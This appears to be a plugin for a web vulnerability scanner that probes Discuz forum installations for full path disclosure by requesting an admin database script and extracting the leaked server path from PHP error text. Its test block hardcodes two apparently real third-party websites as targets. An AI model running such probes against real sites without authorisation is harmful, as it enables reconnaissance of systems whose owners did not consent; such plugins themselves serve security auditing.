#!/usr/bin/env python
import re
import urlparse

def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl(url + 'uc_server/control/admin/db.php')
    if code == 200:
        m = re.search('not found in [<b>]*([^<]+)[</b>]* on line [<b>]*(\d+)', res)
        if m:
            security_info(m.group(1))


if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://www.ytjt.com.cn/')[1])
    audit(assign('discuz', 'http://www.lockbay.cn/')[1])
